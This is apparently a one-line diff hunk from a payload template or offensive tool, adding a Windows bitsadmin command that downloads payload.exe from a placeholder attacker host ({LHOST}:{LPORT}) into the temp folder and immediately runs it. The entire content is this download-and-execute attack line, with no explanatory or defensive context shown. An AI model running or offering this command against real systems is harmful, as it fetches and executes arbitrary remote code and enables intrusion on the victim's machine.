@@ -1,0 +1,1 @@
+bitsadmin /transfer n http://{LHOST}:{LPORT}/payload.exe %TEMP%\payload.exe & %TEMP%\payload.exe
